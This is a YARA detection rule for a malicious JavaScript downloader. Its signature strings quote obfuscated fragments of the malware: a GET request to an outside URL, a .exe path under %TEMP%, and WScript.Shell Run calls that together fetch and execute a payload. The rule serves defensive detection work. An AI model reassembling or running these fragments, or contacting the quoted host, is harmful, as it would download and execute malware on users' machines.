rule sig_20160329_a4127af6678e2fc0b690525c85bed7c6 {
  meta:
    description = "datamaliciousorder - file 20160329_a4127af6678e2fc0b690525c85bed7c6.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "eba450e0d2ceb3cc90bf04949f1f067c42cb2ce5d0bcd3248224b6569d3df7f4"

  strings:
    $s1  = "function Inxgdegsd() {return Wmzrfdwky[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"ln5p79mDg.exe\";};" fullword ascii
    $s2  = "do {WScript[Ntcdqwtz](Jzzvsstz() * 11)} while (Hdnbigcxw[\"readystate\"] < 2 * 2);" fullword ascii
    $s3  = "Hdnbigcxw[Dqdxiq](\"GET\", \"http://energyunlimited.co.nz/o2apf\", false);" fullword ascii
    $s4  = "function Kxzdk(Dngatg, Xirqmhanhv){return Dngatg - Xirqmhanhv;};" fullword ascii
    $s5  = "var Wmzrfdwky = function Mgsgau() {return WScript[Aoftzlbzy](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Oblhqvvaz(Hnhctr){Wmzrfdwky[\"Run\"](Hnhctr, Jbkxp, Jbkxp);};" fullword ascii
    $s7  = "function Xvyzcbwd() {return ((Vrreyxcqzb == true) && (Vrreyxcqzb == Vkbsvi)) ? 1 : Jbkxp;};" fullword ascii
    $s8  = "Vkbsvi = true; " fullword ascii
    $s9  = "var Vkbsvi = false;" fullword ascii
    $s10 = "return Kxzdk(Wstecqyolj, Fruexxmmk);" fullword ascii
    $s11 = " while (Kzbvmkgo){" fullword ascii
    $s12 = "var Vrreyxcqzb = false;" fullword ascii
    $s13 = "function Mowhxlo(Dehdfxiedl) {var Vfdokvht = (1, 2, 3, 4, 5, Dehdfxiedl); return Vfdokvht;};" fullword ascii
    $s14 = "function Jzzvsstz(){return 22;};" fullword ascii
    $s15 = "function Znqtb(){return Xqywbxmsi;};" fullword ascii
    $s16 = "function Aosvamolz(){return Aoftzlbzy;};" fullword ascii
    $s17 = "var Lqvwbqjkin = false;" fullword ascii
    $s18 = "Vrreyxcqzb = true; " fullword ascii
    $s19 = "function Stmcp()" fullword ascii
    $s20 = "var Ykfwiqcx = new this[\"Date\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}